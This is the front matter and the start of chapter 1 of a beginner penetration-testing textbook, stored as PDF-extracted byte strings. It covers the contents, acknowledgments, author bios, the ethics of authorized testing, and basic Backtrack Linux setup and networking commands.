hOR ...............................................................................xi\n', b'ABOUT ThE TEChNICAL EDITOR ............................................................ xiii\n', b'INTRODUCTION ...................................................................................... xv\n', b'ChApTER 1 What Is penetration Testing? ................................................1\n', b'ChApTER 2 Reconnaissance .................................................................15\n', b'ChApTER 3 Scanning ............................................................................43\n', b'ChApTER 4 Exploitation ........................................................................65\n', b'ChApTER 5 Web-Based Exploitation ....................................................107\n', b'ChApTER 6 Maintaining Access with Backdoors and Rootkits ..............127\n', b'ChApTER 7 Wrapping Up the penetration Test .....................................145\n', b'INDEX ..................................................................................................157\n', b'Contents\n', b'vii\n', b'\x0cThis page intentionally left blank\n', b'\x0clike most people, i have a list. the list is made up of life goals and dreams\xe2\x80\x94\n', b'things i would like to accomplish at some point in my life. some of the \n', b'items on the list are big, some small, some well-defined, stable, and concrete, \n', b'whereas others are more transient and ambiguous\xe2\x80\x94like early morning fog \n', b'on the lutsen mountains, constantly changing and moving, sometimes even \n', b'disappearing altogether only to reappear at a later date and time. obviously, \n', b'the list is not a stone tablet; it changes and updates as i move through life. A \n', b'few things, however, have never moved off the list; they stand as the mount \n', b'rushmore\xe2\x80\x99s in my life. Hundreds of feet high, carved into solid granite. never \n', b'changing. Always there. they gracefully weather the storms and vicissitudes of \n', b'life and simply wait to be crossed off. some are nobler, some are egotistical, \n', b'and some are even whimsical. i have had the good fortune in my life to be able \n', b'to cross off many of the items on my list. even the big ones. this book repre-\n', b'sents the crossing off of one of my \xe2\x80\x9crushmore\xe2\x80\x9d items. A presidential face to be \n', b'sure (although i am not sure which face it actually represents!).\n', b'As with most things in life, this book, the end product that you see, is the cul-\n', b'mination of many people\xe2\x80\x99s efforts and energies. so while i do get to cross this \n', b'off my list, and while my name appears on the cover, please do not take that \n', b'to mean that this book is my sole creation. without the dedication, support, \n', b'help, and advice from everyone involved, there is no doubt you would not be \n', b'reading these words right now. writing a proper \xe2\x80\x9cAcknowledgments\xe2\x80\x9d section \n', b'by truly listing everyone involved would fill many, many pages\xe2\x80\x94below you \n', b'will find a simple attempt to say thanks. i apologize in advance if i forgot to \n', b'mention anyone.\n', b'My WIfE\n', b'what can i say that would justify or somehow verbalize what you mean to me? \n', b'there is no doubt that this book is as much an effort on your part as mine. You \n', b'gave me the wings of encouragement to fly and the dedication of long lonely \n', b'days and nights while i worked on it. You never complained, never resisted, \n', b'and were never upset when i needed more from you. every man should be so \n', b'lucky. i am who i am because of you. thank you.\n', b'My GIRLS\n', b'to my little liebchens\xe2\x80\x94you are the light of my life! i apologize for all early \n', b'mornings, late nights, and long weekends. Bring on the sunroom, little People, \n', b'Acknowledgments\n', b'ix\n', b'\x0cAcknowledgments\n', b'x\n', b'mary and Joseph, princesses, Barbie\xe2\x80\x99s, and the Pirate ship! daddy loves you \n', b'more than life itself.\n', b'My fAMILy\n', b'thanks to my mother and father for the gift of education and teaching me to \n', b'understand the value of hard work and dedication to a project. thanks also to \n', b'my other mother, who dedicated countless hours to reading and correcting my \n', b'initial rough drafts.\n', b'TO ThE SyNGRESS TEAM\n', b'thanks for the opportunity! thanks to the editing team; i appreciate all the \n', b'hard work and dedication you gave to this project. special thanks to Angelina \n', b'ward who ultimately earned a green light for the project, to Heather scherer, \n', b'my editor, for the countless hours and assistance, and to James Broad for the \n', b'excellent eye and great suggestions throughout the technical review process.\n', b'to keep up with news and happenings about the book, or other security-\n', b'related content, feel free to follow: pengebretson on twitter or visit my home-\n', b'page: http://homepages.dsu.edu/pengebretson\n', b'\x0cDr. Patrick Engebretson obtained his doctor of science degree with a spe-\n', b'cialization in information security from dakota state University. He currently \n', b'serves as an assistant professor of information assurance and also works as a \n', b'senior penetration tester for a security firm in the midwest. His research inter-\n', b'ests include penetration testing, hacking, intrusion detection, exploitation, \n', b'honey pots, and malware. in the past several years, he has published many \n', b'peer-reviewed journal and conference papers in these areas. He has been \n', b'invited by the department of Homeland security to share his research at the \n', b'software Assurance forum in washington, dc, and has also spoken at Black \n', b'Hat in las Vegas. He regularly attends advanced exploitation and penetration \n', b'testing trainings from industry-recognized professionals and holds several cer-\n', b'tifications. He teaches graduate and undergraduate courses in penetration test-\n', b'ing, wireless security, and intrusion detection, and advanced exploitation.\n', b'xi\n', b'About the Author\n', b'\x0cThis page intentionally left blank\n', b'\x0cxiii\n', b'James Broad (cissP, c|eH, c)Pts, security\xee\x80\xb1, mBA) is the President and \n', b'owner of cyber-recon, llc, where he and his team of consultants special-\n', b'ize in information security, information Assurance, and certification and \n', b'Accreditation and offer other security consultancy services to corporate and gov-\n', b'ernment clients.\n', b'As a security professional with over 20 years of real-world it experience, James \n', b'is an expert in many areas of it security, specializing in security engineering, \n', b'penetration testing, and vulnerability analysis and research. He has provided \n', b'security services in the nation\xe2\x80\x99s most critical sectors including defense, law \n', b'enforcement, intelligence, finance, and healthcare.\n', b'James has a master\xe2\x80\x99s of Business Administration degree with specialization in \n', b'information technology (mBA/it) from the ken Blanchard college of Business, \n', b'Bachelor\xe2\x80\x99s degrees in computer Programming and security management from \n', b'southwestern University and is currently a doctoral learner pursuing a Ph.d. \n', b'in information security from capella University. He is a member of issA and \n', b'(isc) 2\xc2\xae. James currently resides in stafford, Virginia with his family: deanne, \n', b'micheal, and temara.\n', b'About the \n', b'Technical Editor\n', b'xiii\n', b'Openmirrors.com\n', b'\x0cThis page intentionally left blank\n', b'\x0ci suppose there are several questions that may be running through your head \n', b'as you contemplate reading this book: who is the intended audience for this \n', b'book? How is this book different from book \xe2\x80\x98x\xe2\x80\x99 (insert your favorite title here)? \n', b'why should i buy it? Because these are all fair questions and i am asking you \n', b'to plunk down your hard-earned cash, it is important to provide some answers \n', b'to these questions.\n', b'for people who are interested in learning about hacking and penetration test-\n', b'ing, walking into a well-stocked bookstore can be as confusing as searching \n', b'for \xe2\x80\x9chacking\xe2\x80\x9d books at amazon.com. initially, there appears to be an almost \n', b'endless selection to choose from. most large bookstores have several shelves \n', b'dedicated to computer security books. they include books on programming \n', b'security, web application security, rootkits and malware, penetration testing, \n', b'and, of course, hacking. However, even the hacking books seem to vary in con-\n', b'tent and subject matter. some books focus on using tools but do not discuss \n', b'how these tools fit together. other books focus on hacking a particular subject \n', b'but lack the broad picture.\n', b'this book is intended to address these issues. it is meant to be a single starting \n', b'point for anyone interested in the topics of hacking or penetration testing. the \n', b'book will certainly cover specific tools and topics but will also examine how \n', b'the tools fit together and how they rely on one another to be successful.\n', b'WhO IS ThE INTENDED AUDIENCE fOR ThIS BOOK?\n', b'this book is meant to be a very gentle yet thorough guide to the world of hack-\n', b'ing and penetration testing. it is specifically aimed at helping you master the \n', b'basic steps needed to complete a hack or penetration test without overwhelm-\n', b'ing you. By the time you finish this book, you will have a solid understanding \n', b'of the penetration testing process and you will be comfortable with the basic \n', b'tools needed to complete the job.\n', b'specifically, this book is aimed at people who are new to the world of hack-\n', b'ing and penetration testing, for those with little or no previous experience, for \n', b'those who are frustrated by the inability to see the big picture (how the various \n', b'tools and phases fit together), or for those looking to expand their knowledge \n', b'of offensive security.\n', b'in short this book is written for anyone who is interested in computer secu-\n', b'rity, hacking, or penetration testing but has no prior experience and is not sure \n', b'where to begin. A colleague and i call this concept \xe2\x80\x9czero entry hacking\xe2\x80\x9d (ZeH), \n', b'xv\n', b'Introduction\n', b'\x0cIntroduction\n', b'xvi\n', b'much like modern-day swimming pools. Zero entry pools gradually slope from \n', b'the dry end to the deep end, allowing swimmers to wade in without feeling \n', b'overwhelmed or without having a fear of drowning. the \xe2\x80\x9czero entry\xe2\x80\x9d concept \n', b'allows everyone the ability to use the pool regardless of age or swimming abil-\n', b'ity. this book employs a similar technique. ZeH is designed to expose you to \n', b'the basic concepts without overwhelming you. completion of ZeH will pre-\n', b'pare you for advanced courses and books.\n', b'hOW IS ThIS BOOK DIffERENT fROM BOOK \xe2\x80\x98X\xe2\x80\x99?\n', b'when not spending time with my family, there are two things i enjoy doing: \n', b'reading and hacking. most of the time, i combine these hobbies by reading \n', b'about hacking. As a professor and a penetration tester, you can imagine that my \n', b'bookshelf is lined with many books on hacking, security, and penetration test-\n', b'ing. As with most things in life, the quality and value of every book is different. \n', b'some books are excellent resources that have been used so many times that the \n', b'bindings are literally falling apart. others are less helpful and remain in nearly \n', b'new condition. A book that does a good job of explaining the details without \n', b'losing the reader is worth its weight in gold. Unfortunately, most of my per-\n', b'sonal favorites, those that are worn and tattered, are either very lengthy (500\xee\x80\xb1  \n', b'pages) or very focused (an in-depth guide to a single topic). neither of these is \n', b'a bad thing; in fact, quite the opposite, it is the level of detail and the clarity of \n', b'the authors\xe2\x80\x99 explanation that make them so great. But at the same time, a very \n', b'large tome focused on a detailed subject of security can seem overwhelming to \n', b'newcomers.\n', b'Unfortunately, as a beginner trying to break into the security field and learn \n', b'the basics of hacking, tackling one of these books can be both daunting and \n', b'confusing. this book is different from other publications in two ways. first, it \n', b'is meant for beginners; recall the concept of \xe2\x80\x9czero entry.\xe2\x80\x9d if you have never per-\n', b'formed any type of hacking or you have used a few tools but are not quite sure \n', b'what to do next (or how to interpret the results of the tool), this book is for \n', b'you. the goal is not to bury you with details but to present a broad overview of \n', b'the entire field.\n', b'naturally, the book will still cover each of the major tools needed to complete \n', b'the steps in a penetration test, but it will not stop to examine all the in-depth \n', b'or additional functionality for each of these tools. this will be helpful from the \n', b'standpoint that it will focus on the basics, and in most cases allow us to avoid \n', b'confusion caused by advanced features or minor differences in tool versions.\n', b'for example, when we discuss port scanning, the chapter will discuss how to \n', b'run the basic scans with the very popular port scanner nmap. Because the book \n', b'focuses on the basics, it becomes less important exactly which version of nmap \n', b'the user is running. running a sYn scan using nmap is exactly the same regard-\n', b'less of whether you are conducting your scan with nmap version 2 or version 5. \n', b'this technique will be employed as often as possible, doing so should allow the \n', b'\x0cIntroduction  \n', b'xvii\n', b'reader to learn nmap (or any tool) without having to worry about the changes \n', b'in functionality that often accompany advanced features in version changes.\n', b'the goal of this book is to provide general knowledge that will allow you to \n', b'tackle advanced topics and books. remember, once you have a firm grasp of \n', b'the basics, you can always go back and learn the specific details and advanced \n', b'features of a tool. in addition, each chapter will end with a list of suggested \n', b'tools and topics that are outside the scope of this book but can be used for fur-\n', b'ther study and to advance your knowledge.\n', b'Beyond just being written for beginners, this book actually presents the infor-\n', b'mation in a very unique way. All the tools and techniques we use in this book \n', b'will be carried out in a specific order against a small number of related targets \n', b'(all target machines will belong to the same subnet, and the reader will be able \n', b'to easily recreate this \xe2\x80\x9ctarget\xe2\x80\x9d network to follow along). readers will be shown \n', b'how to interpret tool output and how to utilize that output to continue the \n', b'attack from one chapter to the next.\n', b'the use of a sequential and singular rolling example throughout the book will \n', b'help readers see the big picture and better comprehend how the various tools \n', b'and phases fit together. this is different from many other books on the mar-\n', b'ket today, which often discuss various tools and attacks but fail to explain how \n', b'those tools can be effectively chained together. Presenting information in a \n', b'way that shows the user how to clearly move from one phase to another will \n', b'provide valuable experience and allow the reader to complete an entire pene-\n', b'tration test by simply following along with the examples in the book. this con-\n', b'cept should allow the reader to get a clear understanding of the fundamental \n', b'knowledge while learning how the various tools and phases connect.\n', b'Why ShOULD I BUy ThIS BOOK?\n', b'even though the immediate answers to this question are highlighted in the \n', b'preceding sections, below you will find a condensed list of reasons:\n', b'n You want to learn more about hacking and penetration testing but you are \n', b'unsure of where to start.\n', b'n You have dabbled in hacking and penetration testing but you are not sure \n', b'how all the pieces fit together.\n', b'n You want to learn more about the tools and processes that are used by \n', b'hackers and penetration testers to gain access to networks and systems.\n', b'n You are looking for a good place to start building offensive security \n', b'knowledge.\n', b'n You enjoy a challenge.\n', b'Openmirrors.com\n', b'\x0cThis page intentionally left blank\n', b'\x0c1\n', b'INTRODUCTION\n', b'Penetration testing can be defined as a legal and authorized attempt to locate \n', b'and successfully exploit computer systems for the purpose of making those sys-\n', b'tems more secure. the process includes probing for vulnerabilities as well as \n', b'providing proof of concept (Poc) attacks to demonstrate the vulnerabilities \n', b'are real. Proper penetration testing always ends with specific recommendations \n', b'for addressing and fixing the issues that were discovered during the test. on \n', b'the whole, this process is used to help secure computers and networks against \n', b'future attacks.\n', b'Penetration testing is also known as\n', b'n Pen testing\n', b'n Pt\n', b'n Hacking\n', b'n ethical Hacking\n', b'n white Hat Hacking\n', b'it is important to spend a few moments discussing the difference between pen-\n', b'etration testing and vulnerability assessment. many people (and vendors) in \n', b'the security community incorrectly use these terms interchangeably. A vulner-\n', b'ability assessment is the process of reviewing services and systems for poten-\n', b'tial security issues, whereas a penetration test actually performs exploitation \n', b'and Poc attacks to prove that a security issue exists. Penetration tests go a step \n', b'What Is penetration \n', b'Testing?\n', b'ChApTER 1\n', b'Information in This Chapter:\n', b'n Introduction to Backtrack Linux: Tools. Lots of Tools\n', b'n Working with Backtrack: Starting the Engine\n', b'n The Use and Creation of a Hacking Lab\n', b'n Phases of a Penetration Test\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'2\n', b'beyond vulnerability assessments by simulating hacker activity and delivering \n', b'live payloads. in this book, we will cover the process of vulnerability assess-\n', b'ment as one of the steps utilized to complete a penetration test.\n', b'Setting the Stage\n', b'Understanding all the various players and positions in the world of hacking \n', b'and penetration testing is central to comprehending the big picture. let us start \n', b'by painting the picture with broad brush strokes. Please understand that the \n', b'following is a gross oversimplification; however, it should help you see the dif-\n', b'ferences between the various groups of people involved.\n', b'it may help to consider the Star Wars universe where there are two sides of the \n', b'\xe2\x80\x9cforce\xe2\x80\x9d: Jedis and siths. good vs. evil. Both sides have access to an incredible \n', b'power. one side uses its power to protect and serve, whereas the other side uses \n', b'it for personal gain and exploitation.\n', b'learning to hack is much like learning to use the force (or so i imagine!). the \n', b'more you learn, the more power you have. eventually, you will have to decide \n', b'whether you will use your power for good or bad. there is a classic poster from \n', b'the Star Wars episode i movie that depicts Anakin as a young boy. if you look \n', b'closely at Anakin\xe2\x80\x99s shadow in the poster, you will see it is the outline of darth \n', b'Vader. try searching the internet for \xe2\x80\x9cAnakin darth Vader shadow\xe2\x80\x9d to see it. \n', b'Understanding why this poster has appeal is critical. As a boy, Anakin had no \n', b'aspirations of becoming darth Vader, but it happened nonetheless.\n', b'it is probably safe to assume that very few people get into hacking to become \n', b'a super villain. the problem is that journey to the darkside is a slippery slope. \n', b'However, if you want to be great, have the respect of your peers, and be gain-\n', b'fully employed in the security workforce, you need to commit yourself to using \n', b'your powers to protect and serve. Having a felony on your record is a one-way \n', b'ticket to another profession. it is true that there is currently a shortage of quali-\n', b'fied security experts, but even so, not many employers today are willing to take \n', b'a chance, especially if those crimes involve computers.\n', b'in the pen testing world, it is not uncommon to hear the terms \xe2\x80\x9cwhite hat\xe2\x80\x9d and \n', b'\xe2\x80\x9cblack hat\xe2\x80\x9d to describe the Jedis and siths. throughout this book, the terms \n', b'\xe2\x80\x9cwhite hat,\xe2\x80\x9d \xe2\x80\x9cethical hacker,\xe2\x80\x9d or \xe2\x80\x9cpenetration tester\xe2\x80\x9d will be used interchange-\n', b'ably to describe the Jedis. the siths will be referred to as \xe2\x80\x9cblack hats,\xe2\x80\x9d \xe2\x80\x9ccrack-\n', b'ers,\xe2\x80\x9d or \xe2\x80\x9cmalicious attackers.\xe2\x80\x9d\n', b'it is important to note that ethical hackers complete many of the same activi-\n', b'ties with many of the same tools as malicious attackers. in nearly every situ-\n', b'ation, an ethical hacker should strive to act and think like a real black hat \n', b'hacker. the closer the penetration test simulates a real-world attack, the more \n', b'value it provides to the customer paying for the Pt.\n', b'Please note how the previous paragraph says \xe2\x80\x9cin nearly every situation.\xe2\x80\x9d even \n', b'though white hats complete many of the same tasks with many of the same \n', b'tools, there is a world of difference between the two sides. At its core, these \n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'3\n', b'differences can be boiled down to three key points: authorization, motivation, \n', b'and intent. it should be stressed that these points are not all inclusive, but they \n', b'can be useful in determining if an activity is ethical or not.\n', b'the first and simplest way to differentiate between white hats and black hats is \n', b'authorization. Authorization is the process of obtaining approval before con-\n', b'ducting any tests or attacks. once authorization is obtained, both the penetra-\n', b'tion tester and the company being audited need to agree upon the scope of the \n', b'test. the scope includes specific information about the resources and systems \n', b'to be included in the test. the scope explicitly defines the authorized targets \n', b'for the penetration tester. it is important that both sides fully understand the \n', b'authorization and scope of the Pt. white hats must always respect the autho-\n', b'rization and remain within the scope of the test. Black hats will have no such \n', b'constraints on the target list.\n', b'the second way to differentiate between an ethical hacker and a malicious \n', b'hacker is through examination of the attacker\xe2\x80\x99s motivation. if the attacker is \n', b'motivated or driven by personal gain, including profit through extortion or \n', b'other devious methods of collecting money from the victim, revenge, fame, or \n', b'the like, he or she should be considered a black hat. However, if the attacker \n', b'is preauthorized and his or her motivation is to help the organization and \n', b'improve their security, he or she can be considered a white hat.\n', b'finally, if the intent is to provide the organization a realistic attack simula-\n', b'tion so that the company can improve its security through early discovery and \n', b'mitigation of vulnerabilities, the attacker should be considered a white hat. \n', b'it is also important to comprehend the critical nature of keeping Pt findings \n', b'confidential. ethical hackers will never share sensitive information discovered \n', b'during the process of a penetration testing with anyone other than the client. \n', b'However, if the intent is to leverage information for personal profit or gain, the \n', b'attacker should be considered a black hat.\n', b'INTRODUCTION TO BACKTRACK LINUX:  \n', b'TOOLS. LOTS Of TOOLS\n', b'A few years back, the open discussion or teaching of hacking techniques was \n', b'considered a bit taboo. fortunately, times have changed and people are begin-\n', b'ning to understand the value of offensive security. offensive security is now \n', b'being embraced by organizations regardless of size or industries. governments \n', b'are also getting serious about offensive security. many governments have gone \n', b'on record stating they are actively building and developing offensive security \n', b'capabilities.\n', b'Ultimately, penetration testing should play an important role in the overall \n', b'security of your organization. Just as policies, risk assessments, business con-\n', b'tinuity planning, and disaster recovery have become integral components in \n', b'keeping your organization safe and secure, penetration testing needs to be \n', b'included in your overall security plan as well. Penetration testing allows you \n', b'\x0cThe Basics of hacking and penetration Testing\n', b'4\n', b'to view your organization through the eyes of the enemy. this process can lead \n', b'to many surprising discoveries and give you the time needed to patch your sys-\n', b'tems before a real attacker can strike.\n', b'one of the great things about learning how to hack today is the plethora and \n', b'availability of good tools to perform your craft. not only are the tools read-\n', b'ily available, but many of them are stable with several years of development \n', b'behind them. maybe even more important to many of you is the fact that most \n', b'of these tools are available free of charge. for the purpose of this book, every \n', b'tool covered will be free.\n', b'it is one thing to know a tool is free, it is another to find, compile, and install \n', b'each of the tools required to complete even a basic penetration test. Although \n', b'this process is quite simple on today\xe2\x80\x99s modern linux os\xe2\x80\x99s, it can still be a bit \n', b'daunting for newcomers. most people who start are usually more interested in \n', b'learning how to use the tools than they are in searching the vast corners of the \n', b'internet locating and installing tools.\n', b'to be fair, you really should learn how to manually compile and install soft-\n', b'ware on a linux machine; or at the very least, you should become familiar with \n', b'apt-get (or the like).\n', b'MORE ADvANCED\n', b'APT, short for Advanced Package Tool, is a package management system. APT allows \n', b'you to quickly and easily install, update, and remove software from the command \n', b'line. Aside from its simplicity, one of the best things about APT is the fact that it \n', b'automatically resolves dependency issues for you. This means that if the package  \n', b'you are installing requires additional software, APT will automatically locate and \n', b'install the additional software. This is a massive improvement over the old days of \n', b'\xe2\x80\x9cdependency hell.\xe2\x80\x9d\n', b'Installing software with APT is very straightforward. For example, let us assume you want \n', b'to install the classic network-mapping tool Cheops. Once you know the name of the \n', b'package you want to install, from the command line you can run apt-get install \n', b'followed by the name of the software you want to install. It is always a good idea to run \n', b'apt-get update before installing software. This will ensure that you are getting the \n', b'latest version available. To install Cheops, we would issue the following commands:\n', b'apt-get update\n', b'apt-get install cheops\n', b'Before the package is installed, you will be shown how much disk space will be used \n', b'and you will be asked if you want to continue. To install your new software, you can \n', b'type \xe2\x80\x9cY\xe2\x80\x9d and hit the enter key.\n', b'If you prefer not to use the command line, there are several GUIs available for \n', b'interacting with APT. The most popular graphical front end is currently Aptitude. \n', b'Additional package managers are outside the scope of this book.\n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'5\n', b'A basic understanding of linux will be beneficial and will pay you mountains \n', b'of dividends in the long run. for the purpose of this book, there will be no \n', b'assumption that you have prior linux experience, but do yourself a favor and \n', b'commit yourself to becoming a linux guru someday. take a class, read a book, \n', b'or just explore on your own. trust me, you will thank me later. if you are inter-\n', b'ested in penetration testing or hacking, there is no way of getting around the \n', b'need to know linux.\n', b'fortunately, the security community is a very active and very giving group. \n', b'there are several organizations that have worked tirelessly to create various \n', b'security-specific linux distributions. A distribution, or \xe2\x80\x9cdistro\xe2\x80\x9d for short, is basi-\n', b'cally a flavor, type, or brand of linux.\n', b'Among the most well known of these penetration testing distributions is one \n', b'called \xe2\x80\x9cBacktrack.\xe2\x80\x9d Backtrack linux is your one-stop shop for learning hacking \n', b'and performing penetration testing. Backtrack linux reminds me of that scene \n', b'in the first Matrix movie where tank asks neo \xe2\x80\x9cwhat do you need besides a \n', b'miracle?\xe2\x80\x9d neo responds with \xe2\x80\x9cguns. lots of guns.\xe2\x80\x9d At this point in the movie, \n', b'rows and rows of guns slide into view. every gun imaginable is available for \n', b'neo and trinity: handguns, rifles, shotguns, semiautomatic, automatic, big and \n', b'small from pistols to explosives, an endless supply of different weapons from \n', b'which to choose. that is a similar experience most newcomers have when they \n', b'first boot up Backtrack. \xe2\x80\x9ctools. lots of tools.\xe2\x80\x9d\n', b'Backtrack linux is a hacker\xe2\x80\x99s dream come true. the entire distribution is built \n', b'from the ground up for penetration testers. the distribution comes preloaded \n', b'with hundreds of security tools that are installed, configured, and ready to \n', b'be used. Best of all, Backtrack is free! You can get your copy at http://www.\n', b'Backtrack-linux.org/downloads/.\n', b'navigating to the Backtrack link will allow you to choose from either an .iso or \n', b'a Vmware image. if you choose to download the .iso, you will need to burn the \n', b'.iso to a dVd. if you are unsure of how to complete this process, please google \n', b'\xe2\x80\x9cburning an iso.\xe2\x80\x9d once you have completed the burning process, you will have \n', b'a bootable dVd. in most cases, starting Backtrack from a bootable dVd is as \n', b'simple as putting the dVd into the drive and restarting the machine. in some \n', b'instances, you may have to change the boot order in the Bios so that the opti-\n', b'cal drive has the highest boot priority.\n', b'if you choose to download the Vmware image, you will also need software \n', b'capable of opening and deploying or running the image. luckily enough, there \n', b'are several good tools for accomplishing this task. depending on your prefer-\n', b'ence, you can use Vmware\xe2\x80\x99s Vmware Player, sun microsystem\xe2\x80\x99s VirtualBox, or \n', b'microsoft\xe2\x80\x99s Virtual Pc. in reality, if you do not like any of those options, there \n', b'are many other software options capable of running a Vm image. You simply \n', b'need to choose one that you are comfortable with.\n', b'each of the three virtualization options listed above are available free of charge \n', b'and will provide you with the ability to run Vm images. You will need to \n', b'Openmirrors.com\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'6\n', b'decide which version is best for you. this book will rely heavily on the use of \n', b'a Backtrack Vmware image and Vmware Player. At the time of writing, Vmware \n', b'Player was available at: http://www.vmware.com/products/player/. You will \n', b'need to register for an account to download the software, but the registration \n', b'process is simple and free.\n', b'if you are unsure of which option to choose, it is suggested that you go the \n', b'Vmware route. not only is this another good technology to learn, but using \n', b'Vms will allow you to set up an entire penetration testing lab on a single \n', b'machine. if that machine is a laptop, you essentially have a \xe2\x80\x9ctravelling\xe2\x80\x9d Pt lab \n', b'so you can practice your skills anytime, anywhere.\n', b'if you choose to run Backtrack using the bootable dVd, shortly after the sys-\n', b'tem starts, you will be presented with a menu list. You will need to review the \n', b'list carefully, as it contains several different options. the first couple of options \n', b'are used to set some basic information about your system\xe2\x80\x99s screen resolution. \n', b'if you are having trouble getting Backtrack to boot, be sure to choose the \xe2\x80\x9cstart \n', b'Backtrack in safe graphical mode.\xe2\x80\x9d the menu contains several other options, \n', b'but these are outside the scope of this book. to select the desired boot option, \n', b'simply use the arrow keys to highlight the appropriate row and hit the enter \n', b'key to confirm your selection. figure 1.1 shows an example of the Backtrack \n', b'boot screen.\n', b'the use of Backtrack is not required to work through this book or to learn the \n', b'basics of hacking. Any version of linux will do fine. the major advantage of \n', b'using Backtrack is that all the tools are preloaded for you. if you choose to use \n', b'a different version of linux, you will need to install the tools before reading \n', b'the chapter. it is also important to remember that because this book focuses on \n', b'the basics, it does not matter which version of Backtrack you are using. All the \n', b'tools we will explore and use in this book are available in every version.\n', b'WORKING WITh BACKTRACK: STARTING ThE ENGINE\n', b'regardless of whether you choose to run Backtrack as a Vm or boot to a live \n', b'dVd, once the initial system is loaded you will be presented with a log-in \n', b'prompt. the default username is root and the default password is toor.\n', b'fIGURE 1.1\n', b'A Screenshot Showing the Boot Options When Using the Live DVD.\n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'7\n', b'notice the default password is simply \xe2\x80\x9croot\xe2\x80\x9d spelled backward. this default \n', b'username and password combination has been in use since Backtrack 1, and \n', b'most likely it will remain in use for future versions. At this point, you should \n', b'be logged into the system and should be presented with \xe2\x80\x9croot@bt:~#\xe2\x80\x9d \n', b'prompt. Although it is possible to run many of the tools we will discuss in this \n', b'book directly from the terminal, it is often easier for newcomers to make use \n', b'of the x window system. You can start the gUi by typing the following com-\n', b'mand after the \xe2\x80\x9croot@bt~#\xe2\x80\x9d prompt:\n', b'startx\n', b'After typing this command and hitting the enter key, x will begin to load. this \n', b'environment should seem vaguely familiar to most computer users. once it \n', b'has completely loaded, you will see a desktop, icons, a task bar, and a system \n', b'tray. Just like microsoft windows, you can interact with these items by moving \n', b'your mouse cursor and clicking on the desired object.\n', b'most of the programs we will use in this book will be run out of the termi-\n', b'nal. You can start a terminal session by either clicking on the black box located \n', b'in the lower left in the taskbar, or by typing the following command into the \n', b'launcher as shown in figure 1.2.\n', b'konsole\n', b'Unlike microsoft windows or many of the modern-day linux os\xe2\x80\x99s, by default, \n', b'Backtrack does not come with networking enabled. this setup is by design. \n', b'As a penetration tester, we often try to maintain a stealthy or undetected pres-\n', b'ence. nothing screams \xe2\x80\x9clook At me!! look At me!! i\xe2\x80\x99m Here!!!\xe2\x80\x9d like a \n', b'computer that starts up and instantly begins spewing network traffic by broad-\n', b'casting requests for a dHcP server and iP address. to avoid this issue, the net-\n', b'working interfaces of your Backtrack machine are turned down (off) by default.\n', b'the easiest way to enable networking is through the terminal. open a terminal \n', b'window by clicking on the terminal icon as shown by the leftmost arrow in \n', b'figure 1.2. once the terminal opens, enter the following command:\n', b'ifconfig \xe2\x80\x93a\n', b'this command will list all the available interfaces for your machine. At a \n', b'minimum, most machines will include an eth0 and a lo interface. the \xe2\x80\x9clo\xe2\x80\x9d \n', b'fIGURE 1.2\n', b'Two Ways to Launch the Konsole (Terminal).\n', b'\x0cThe Basics of hacking and penetration Testing\n', b'8\n', b'interface is your loopback interface. the \xe2\x80\x9ceth0\xe2\x80\x9d is your first ethernet card. \n', b'depending on your hardware, you may have additional interfaces or differ-\n', b'ent interface numbers listed. if you are running Backtrack through a Vm, your \n', b'main interface will usually be eth0.\n', b'to turn the network card on, you enter the following command into a terminal \n', b'window:\n', b'ifconfig eth0 up\n', b'let us examine this command in more detail; \xe2\x80\x9cifconfig\xe2\x80\x9d is a linux command \n', b'that means \xe2\x80\x9ci want to configure a network interface.\xe2\x80\x9d As we already know, \n', b'\xe2\x80\x9ceth0\xe2\x80\x9d is the first network device on our system (remember computers often \n', b'start counting at 0 not 1), and the keyword \xe2\x80\x9cup\xe2\x80\x9d is used to activate the inter-\n', b'face. so we can roughly translate the command you entered as \xe2\x80\x9ci want to con-\n', b'figure the first interface to be turned on.\xe2\x80\x9d\n', b'now that the interface is turned on, we need to get an iP address. there are \n', b'two basic ways to complete this task. our first option is to assign the address \n', b'manually by appending the desired iP address to the end of the previous com-\n', b'mand. for example, if we wanted to assign our network card an iP address of \n', b'192.168.1.23, we would type:\n', b'ifconfig eth0 up 192.168.1.23\n', b'At this point, the machine will have an iP address but will still need a gateway \n', b'and domain name system (dns) server. A simple google search for \xe2\x80\x9csetting \n', b'up nic linux\xe2\x80\x9d will show you how to enter that information. You can always \n', b'check to see if your commands worked by issuing the following command into \n', b'a terminal window:\n', b'ifconfig\n', b'running this will allow you to see the current settings for your network inter-\n', b'faces. Because this is a beginner\xe2\x80\x99s guide and for the sake of simplicity, we will \n', b'assume that stealth is not a concern at the moment. in that case, the easiest \n', b'way to get an address is to use dHcP. to assign an address through dHcP, you \n', b'simply issue the command:\n', b'dhclient eth0\n', b'Please note, this assumes you have already successfully run the command to \n', b'turn up your network interface (eth0 in this case).\n', b'now that we have successfully assigned an iP address, the last thing to address \n', b'is how to turn off Backtrack. As with most things in linux, there are multiple \n', b'ways to accomplish this task. one of the easiest ways is to enter the following \n', b'command into a terminal window:\n', b'poweroff\n', b'You can also substitute the poweroff command with the reboot command if \n', b'you would prefer to restart the system rather than shut it down.\n', b'\x0cWhat Is penetration Testing? ChApTER 1\n', b'9\n', b'Before proceeding, you should take several minutes to review and practice all \n', b'the steps highlighted thus far including\n', b'n Power on/start up Backtrack\n', b'n log in with the default user name and password\n', b'n start x (the windows gUi)\n', b'n View all the network interfaces on your machine\n', b'n turn up (on) the desired network interface\n', b'n Assign an iP address manually\n', b'n View the manually assigned iP address\n', b'n Assign an iP address through dHcP\n', b'n View the dynamically assigned address\n', b'n reboot the machine using the command line interface\n', b'n Poweroff the machine using the command line interface\n', b'ThE USE AND CREATION Of A hACKING LAB\n', b'every ethical hacker must have a place to practice and explore. most newcomers \n', b'are confused about how they can learn to use hacking tools without breaking the \n', b'law or attacking unauthorized targets. this is most often accomplished through \n', b'the creation of a personal \xe2\x80\x9chacking lab.\xe2\x80\x9d A hacking lab is a sandboxed environ-\n', b'ment where your traffic and attacks have no chance of escaping or reaching unau-\n', b'thorized and unintended targets. in this environment, you are free to explore \n', b'all the various tools and techniques without fear that some traffic or attack will \n', b'escape your network. At a minimum, the lab is set up to contain at least two \n', b'machines: one attacker and one victim. in other configurations, several victim \n', b'machines can be deployed simultaneously to simulate a more realistic network.\n', b'the 